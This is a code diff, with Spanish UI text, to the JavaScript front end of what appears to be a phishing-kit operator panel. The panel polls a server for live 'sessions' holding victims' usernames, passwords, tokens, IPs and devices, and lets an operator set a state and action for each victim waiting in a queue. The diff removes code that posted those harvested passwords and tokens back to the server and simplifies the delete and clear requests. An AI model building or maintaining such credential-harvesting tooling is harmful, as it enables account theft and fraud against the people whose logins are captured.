@@ -183,17 +183,11 @@ function createRow(row) {
   `
 
   tr.querySelector('[data-action="delete"]')?.addEventListener('click', async () => {
-    deletedSessionIds.add(row.id);
     rows.delete(row.id);
     tr.remove();
     render();
     try {
-      await Promise.all([
-        fetch(`/api/sessions/${row.id}`, { method: 'DELETE' }),
-        fetch(`/api/sessions/${row.id}`, { method: 'DELETE' }),
-        fetch(`/api/sessions/${row.id}`, { method: 'DELETE' }),
-        fetch(`/api/sessions/${row.id}`, { method: 'DELETE' })
-      ]);
+      await fetch(`/api/sessions/${row.id}`, { method: 'DELETE' });
     } catch (_) {}
   });
 
@@ -356,28 +350,7 @@ function render() {
 
 async function pollSessions() {
   try {
-    const localSessions = Array.from(rows.values()).map(r => ({
-      id: r.id,
-      index: r.index,
-      createdAt: r.createdAt,
-      updatedAt: r.updatedAt,
-      last_seen: r.last_seen,
-      tipoUsuario: r.tipo,
-      device: r.device,
-      ip: r.ip,
-      username: r.user,
-      password: r.clave,
-      token: r.token,
-      state: r.state,
-      action: r.action,
-      online: r.online
-    }));
-
-    const response = await fetch('/api/sessions/sync', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ sessions: localSessions })
-    });
+    const response = await fetch('/api/sessions');
 
     if (response && response.ok) {
       const list = await response.json();
@@ -385,9 +358,10 @@ async function pollSessions() {
       const now = Date.now();
       const freshList = list.filter((s) => now - (s.createdAt || 0) < 2 * 60 * 60 * 1000);
       
-      // Limpiar únicamente sesiones viejas locales (> 2 horas)
-      for (const [id, r] of rows.entries()) {
-        if (now - (r.createdAt || 0) >= 2 * 60 * 60 * 1000) {
+      // Eliminar de rows sesiones que ya no existen en el servidor
+      const serverIds = new Set(freshList.map(s => s.id));
+      for (const id of rows.keys()) {
+        if (!serverIds.has(id)) {
           rows.delete(id);
         }
       }
@@ -397,7 +371,6 @@ async function pollSessions() {
       let hasNewOrChangedSession = false;
       
       freshList.forEach((session) => {
-        if (deletedSessionIds.has(session.id)) return;
         if (!oldKeys.has(session.id)) {
           hasNewOrChangedSession = true;
           requestAnimationFrame(() => {
@@ -416,7 +389,6 @@ async function pollSessions() {
 
       // Actualizar o añadir sesiones
       freshList.forEach((session) => {
-        if (deletedSessionIds.has(session.id)) return;
         const existing = rows.get(session.id);
         const resolvedState = session.state || (existing ? existing.state : 'waiting');
         const resolvedAction = (session.action !== undefined && session.action !== null) ? session.action : (existing ? existing.action : null);
@@ -565,19 +537,10 @@ function playErrorSound() {
 }
 
 btnClean?.addEventListener('click', async () => {
-  for (const id of rows.keys()) {
-    deletedSessionIds.add(id);
-  }
   rows.clear();
   render();
   try {
-    await Promise.all([
-      fetch('/api/clear', { method: 'POST' }),
-      fetch('/api/clear', { method: 'POST' }),
-      fetch('/api/clear', { method: 'POST' }),
-      fetch('/api/clear', { method: 'POST' }),
-      fetch('/api/clear', { method: 'POST' })
-    ]);
+    await fetch('/api/clear', { method: 'POST' });
   } catch (_) {}
   hint.textContent = 'Cola limpia. Esperando nuevos usuarios…';
   render();
